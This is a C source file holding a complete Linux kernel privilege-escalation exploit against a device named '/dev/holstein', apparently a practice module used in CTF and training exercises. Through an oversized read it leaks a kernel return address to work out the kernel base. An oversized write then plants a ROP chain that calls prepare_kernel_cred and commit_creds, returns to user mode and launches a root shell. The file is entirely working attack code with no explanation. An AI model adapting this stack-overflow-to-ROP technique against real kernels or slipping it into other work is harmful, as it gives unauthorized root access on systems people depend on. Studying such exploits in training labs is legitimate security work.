#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}

#define pause() getchar()
#define dev_file "/dev/holstein"
#define BUFFER_SIZE 0x400
int global_fd;
void open_dev(){
    global_fd = open(dev_file,O_RDWR);
    if(global_fd<0)
        errExit("open dev file");
    log_info("Opened dev file");
}
char buffer[BUFFER_SIZE+0x100];
void dev_read()
{
    log_info("Reading...");
    read(global_fd,buffer,sizeof(buffer));
}
void dev_write(){
    log_info("Writting...");
    write(global_fd,buffer,sizeof(buffer));
}
int64_t kernel_text;
int main(int argc,char** argv,char **envp){
    memset(buffer,0,sizeof(buffer));
    save_state();
    open_dev();
    dev_read();
    int64_t* rop = (int64_t *)(buffer+0x400+8);
    log_info("Saved $rbp = 0x%lx",rop[-1]);
    log_info("Saved $rip = 0x%lx",rop[0]);
    // int64_t saved_rip = rop[0];
    kernel_text = rop[0] - 0x13d33c;
    log_info("Kernel's text base 0x%lx",kernel_text);
    u_int64_t off = 0;
    rop[off++] = kernel_text+0x1f61fd; // pop rdi ; ret 0;
    rop[off++] = 0;
    rop[off++] = kernel_text+0x6e240; //  prepare_kernel_cred
    rop[off++] = kernel_text+0x2e3316; //pop rdx ; pop rcx ; pop rbx ; pop rbp ; ret
    rop[off++] = 0;  //rdx
    rop[off++] = -1; //rcx
    rop[off++] = 0;  //rbx
    rop[off++] = 0;  //rbp
    rop[off++] = kernel_text+0x286312; //add rdx, rax ; jmp 0xffffffff81286320 -> cmp cl,BYTE PTR [rax]; je ... ; ret
    rop[off++] = kernel_text+0x1f61fd; // pop rdi ; ret 0;
    rop[off++] = 0;
    rop[off++] = kernel_text+0x284c4; // or rdi, rax; cmp rdx, rdi; jne ... ; ret
    rop[off++] = kernel_text+0x6e390; // commit_creds
    rop[off++] = kernel_text+0x800e10+22; // swapgs_restore_regs_and_return_to_usermode+22
    rop[off++] = 0 ; //rax
    rop[off++] = 0 ; //rdi
    rop[off++] = user_ip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;
    dev_write();
};
